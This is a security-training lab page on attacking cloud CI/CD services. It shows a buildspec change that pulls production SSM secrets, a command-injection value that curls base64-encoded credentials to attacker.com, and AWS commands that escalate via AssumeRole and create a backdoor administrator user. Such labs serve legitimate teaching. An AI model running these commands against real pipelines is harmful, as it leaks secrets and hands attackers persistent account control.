# Lab 9.3: Cloud CI/CD Attacks (Beyond GitHub Actions)

<div class="phase-stepper">
  <a href="../" class="phase-step done">Overview</a>
  <span class="phase-arrow">›</span>
  <a href="../understand/" class="phase-step done">Understand</a>
  <span class="phase-arrow">›</span>
  <span class="phase-step current">Break</span>
  <span class="phase-arrow">›</span>
  <a href="../defend/" class="phase-step upcoming">Defend</a>
  <span class="phase-arrow">›</span>
  <a href="../detect/" class="phase-step upcoming">Detect</a>
</div>

**Goal:** Execute three attacks against cloud-native CI/CD services.

## Attack 1: CodeBuild SSM parameter injection

A PR modifies `buildspec.yml` to add SSM parameter references for production secrets:

```yaml
env:
  parameter-store:
    PROD_DB_PASSWORD: /prod/database/master-password
    STRIPE_SECRET: /prod/payments/stripe-secret-key
```

The build fetches these secrets. Attacker exfiltrates via HTTP or embeds them in Docker image layers via `--build-arg`.

## Attack 2: Cloud Build substitution variable abuse

```bash
# _TEST_COMMAND = "npm test; curl https://attacker.com/$(cat /workspace/credentials.json | base64)"
```

Injected into `sh -c '${_TEST_COMMAND}'`. The attacker gets the Cloud Build service account's credentials.

## Attack 3: Build role privilege escalation

The CodeBuild role has `sts:AssumeRole` on `*`. During a build:

```bash
ADMIN_CREDS=$(aws sts assume-role \
    --role-arn arn:aws:iam::123456789012:role/AdminRole \
    --role-session-name "codebuild-escalation")
# Create backdoor IAM user with AdministratorAccess
aws iam create-user --user-name build-service-account
aws iam attach-user-policy --user-name build-service-account \
    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

Permanent admin access survives after build finishes.

---

!!! success "Checkpoint"
    You should understand all three attack vectors and why they succeed: account-wide SSM access, unsanitized substitution variables in shell commands, and unrestricted AssumeRole permissions.
